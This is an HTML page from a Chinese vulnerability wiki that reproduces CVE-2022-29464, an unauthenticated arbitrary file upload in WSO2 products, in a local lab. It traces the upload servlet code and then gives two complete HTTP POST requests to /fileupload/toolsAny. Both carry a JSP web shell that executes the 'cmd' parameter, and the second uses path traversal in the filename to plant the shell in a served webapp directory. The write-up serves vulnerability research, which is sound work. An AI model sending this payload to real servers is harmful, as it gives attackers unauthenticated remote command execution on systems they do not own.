<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%9C%AA%E5%88%86%E7%B1%BB/WSO2%20fileupload%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CVE-2022-29464/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>WSO2 fileupload 任意文件上传漏洞 CVE-2022-29464 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "WSO2 fileupload \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e CVE-2022-29464", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u73af\u5883\u642d\u5efa", url: "#_3" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../WSO2%20proxy%20SSRF%E6%BC%8F%E6%B4%9E%20WSO2-2019-0598/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../WSO2%20proxy%20SSRF%E6%BC%8F%E6%B4%9E%20WSO2-2019-0598/" class="btn btn-xs btn-link">
        WSO2 proxy SSRF漏洞 WSO2-2019-0598
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../TerraMaster%20TOS%20%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E%20CVE-2020-28185/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../TerraMaster%20TOS%20%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E%20CVE-2020-28185/" class="btn btn-xs btn-link">
        TerraMaster TOS 用户枚举漏洞 CVE-2020-28185
      </a>
    </div>
    
  </div>

    

    <h1 id="wso2-fileupload-cve-2022-29464">WSO2 fileupload 任意文件上传漏洞 CVE-2022-29464<a class="headerlink" href="#wso2-fileupload-cve-2022-29464" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>CVE-2022-29464 是 Orange Tsai发现的 WSO2 上的严重漏洞。该漏洞是一种未经身份验证的无限制任意文件上传，允许未经身份验证的攻击者通过上传恶意 JSP 文件在 WSO2 服务器上获得 RCE。</p>
<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>WSO2 API Manager 2.2.0 and above
WSO2 Identity Server 5.2.0 and above
WSO2 Identity Server Analytics 5.4.0, 5.4.1, 5.5.0, 5.6.0
WSO2 Identity Server as Key Manager 5.3.0 and above
WSO2 Enterprise Integrator 6.2.0 and above
</code></pre></div>
<h2 id="_3">环境搭建<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p><a href="https://github.com/wso2/product-apim/releases/download/v4.0.0/wso2am-4.0.0.zip">https://github.com/wso2/product-apim/releases/download/v4.0.0/wso2am-4.0.0.zip</a></p>
<p><a href="https://github.com/wso2/product-apim/archive/refs/tags/v4.0.0.zip">https://github.com/wso2/product-apim/archive/refs/tags/v4.0.0.zip</a></p>
<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<p>下载 releases 后进入 bin目录, 执行 api.manager.sh文件，并开启 debug 方便远程调试</p>
<p><img alt="" src="../images/202205241641592.png" /></p>
<p>打开 product-apim-4.0.0 ，下载依赖，连接Debug进行调试分析</p>
<p><img alt="" src="../images/202205241641901.png" /></p>
<p>运行后访问 localhost:9443 出现如下即搭建完成</p>
<p><img alt="" src="../images/202205241642560.png" /></p>
<p>在配置文件 identity.xml 中我们可以看到 路由 <code>/fileupload</code> 中不存在权限鉴定, 对应的 Servlet 为 FileUploadServlet</p>
<p><img alt="" src="../images/202205241642432.png" /></p>
<p>文件上传为POST请求，对应的处理方法为 <code>doPost (org.wso2.carbon.ui.transports.FileUploadServlet#doPost)</code></p>
<div class="highlight"><pre><span></span><code>protected void doPost(HttpServletRequest request,
                          HttpServletResponse response) throws ServletException, IOException {

        try {
            fileUploadExecutorManager.execute(request, response);
        } catch (Exception e) {
            String msg = &quot;File upload failed &quot;;
            log.error(msg, e);
            throw new ServletException(e);
        }
    }
</code></pre></div>
<p>继续向下，略过调用方法的过程</p>
<div class="highlight"><pre><span></span><code>execute:55, ToolsAnyFileUploadExecutor (org.wso2.carbon.ui.transports.fileupload)
executeGeneric:104, AbstractFileUploadExecutor (org.wso2.carbon.ui.transports.fileupload)
execute:436, FileUploadExecutorManager$CarbonXmlFileUploadExecHandler (org.wso2.carbon.ui.transports.fileupload)
startExec:320, FileUploadExecutorManager$FileUploadExecutionHandlerManager (org.wso2.carbon.ui.transports.fileupload)
execute:127, FileUploadExecutorManager (org.wso2.carbon.ui.transports.fileupload)
</code></pre></div>
<p><img alt="" src="../images/202205241642357.png" /></p>
<p><img alt="" src="../images/202205241642961.png" /></p>
<p>最后来到出现漏洞的位置 <code>org.wso2.carbon.ui.transports.fileupload.ToolsAnyFileUploadExecutor#execute</code></p>
<p>这里我们构造请求包，上传文件</p>
<div class="highlight"><pre><span></span><code>POST /fileupload/toolsAny HTTP/1.1
Host: localhost:9443
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 729
Content-Type: multipart/form-data; boundary=4ef9f369a86bfaadf5ec3177278d49c0
User-Agent: python-requests/2.22.0

--4ef9f369a86bfaadf5ec3177278d49c0
Content-Disposition: form-data; name=&quot;1.jsp&quot;; filename=&quot;1.jsp&quot;

&lt;FORM&gt;
    &lt;INPUT name=&#39;cmd&#39; type=text&gt;
    &lt;INPUT type=submit value=&#39;Run&#39;&gt;
&lt;/FORM&gt;
&lt;%@ page import=&quot;java.io.*&quot; %&gt;
    &lt;%
    String cmd = request.getParameter(&quot;cmd&quot;);
    String output = &quot;&quot;;
    if(cmd != null) {
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(cmd,null,null);
            BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
            while((s = sI.readLine()) != null) { output += s+&quot;&lt;/br&gt;&quot;; }
        }  catch(IOException e) {   e.printStackTrace();   }
    }
%&gt;
        &lt;pre&gt;&lt;%=output %&gt;&lt;/pre&gt;
--4ef9f369a86bfaadf5ec3177278d49c0--
</code></pre></div>
<p><img alt="" src="../images/202205241642011.png" /></p>
<p>上传时文件名为 1.jsp，成功上传目标会返回 uuid 值, 调试过程中我们可以发现文件被上传在某个目录下</p>
<p><img alt="" src="../images/202205241642860.png" /></p>
<div class="highlight"><pre><span></span><code>public class ToolsAnyFileUploadExecutor extends AbstractFileUploadExecutor {

    @Override
    public boolean execute(HttpServletRequest request,
            HttpServletResponse response) throws CarbonException, IOException {
        PrintWriter out = response.getWriter();
        try {
            Map fileResourceMap =
                (Map) configurationContext
                        .getProperty(ServerConstants.FILE_RESOURCE_MAP);
            if (fileResourceMap == null) {
                fileResourceMap = new TreeBidiMap();
                configurationContext.setProperty(ServerConstants.FILE_RESOURCE_MAP,
                                             fileResourceMap);
            }
            List&lt;FileItemData&gt; fileItems = getAllFileItems();
            //String filePaths = &quot;&quot;;

            for (FileItemData fileItem : fileItems) {
                String uuid = String.valueOf(
                        System.currentTimeMillis() + Math.random());
                String serviceUploadDir =
                        configurationContext
                                .getProperty(ServerConstants.WORK_DIR) +
                                File.separator +
                                &quot;extra&quot; + File
                                .separator +
                                uuid + File.separator;
                File dir = new File(serviceUploadDir);
                if (!dir.exists()) {
                    dir.mkdirs();
                }
                File uploadedFile = new File(dir, fileItem.getFileItem().getFieldName());
                try (FileOutputStream fileOutStream = new FileOutputStream(uploadedFile)) {
                    fileItem.getDataHandler().writeTo(fileOutStream);
                    fileOutStream.flush();
                }
                response.setContentType(&quot;text/plain; charset=utf-8&quot;);
                //filePaths = filePaths + uploadedFile.getAbsolutePath() + &quot;,&quot;;
                fileResourceMap.put(uuid, uploadedFile.getAbsolutePath());
                out.write(uuid);
            }
            //filePaths = filePaths.substring(0, filePaths.length() - 1);
            //out.write(filePaths);
            out.flush();
        } catch (Exception e) {
            log.error(&quot;File upload FAILED&quot;, e);
            out.write(&quot;&lt;script type=\&quot;text/javascript\&quot;&gt;&quot; +
                    &quot;top.wso2.wsf.Util.alertWarning(&#39;File upload FAILED. File may be non-existent or invalid.&#39;);&quot; +
                    &quot;&lt;/script&gt;&quot;);
        } finally {
            out.close();
        }
        return true;
    }

}
</code></pre></div>
<p><img alt="" src="../images/202205241643581.png" /></p>
<p>但文件名是我们可控的，拼接的过程中我们通过控制文件名遍历目录，将文件上传到我们需要的位置, 查找可以解析 jsp文件的目录</p>
<p><img alt="" src="../images/202205241643426.png" /></p>
<p>构造请求包，通过控制文件名的方法上传至该目录中</p>
<div class="highlight"><pre><span></span><code>POST /fileupload/toolsAny HTTP/1.1
Host: localhost:9443
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 729
Content-Type: multipart/form-data; boundary=4ef9f369a86bfaadf5ec3177278d49c0
User-Agent: python-requests/2.22.0

--4ef9f369a86bfaadf5ec3177278d49c0
Content-Disposition: form-data; name=&quot;../../../../repository/deployment/server/webapps/authenticationendpoint/1.jsp&quot;; filename=&quot;../../../../repository/deployment/server/webapps/authenticationendpoint/1.jsp&quot;

&lt;FORM&gt;
    &lt;INPUT name=&#39;cmd&#39; type=text&gt;
    &lt;INPUT type=submit value=&#39;Run&#39;&gt;
&lt;/FORM&gt;
&lt;%@ page import=&quot;java.io.*&quot; %&gt;
    &lt;%
    String cmd = request.getParameter(&quot;cmd&quot;);
    String output = &quot;&quot;;
    if(cmd != null) {
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(cmd,null,null);
            BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
            while((s = sI.readLine()) != null) { output += s+&quot;&lt;/br&gt;&quot;; }
        }  catch(IOException e) {   e.printStackTrace();   }
    }
%&gt;
        &lt;pre&gt;&lt;%=output %&gt;&lt;/pre&gt;
--4ef9f369a86bfaadf5ec3177278d49c0--
</code></pre></div>
<p><img alt="" src="../images/202205241643756.png" /></p>
<p>访问上传的文件，<code>/authenticationendpoint/xxx.jsp?cmd=ls</code></p>
<p><img alt="" src="../images/202205241643038.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../WSO2%20proxy%20SSRF%E6%BC%8F%E6%B4%9E%20WSO2-2019-0598/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../WSO2%20proxy%20SSRF%E6%BC%8F%E6%B4%9E%20WSO2-2019-0598/" class="btn btn-xs btn-link">
        WSO2 proxy SSRF漏洞 WSO2-2019-0598
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../TerraMaster%20TOS%20%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E%20CVE-2020-28185/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../TerraMaster%20TOS%20%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E%20CVE-2020-28185/" class="btn btn-xs btn-link">
        TerraMaster TOS 用户枚举漏洞 CVE-2020-28185
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>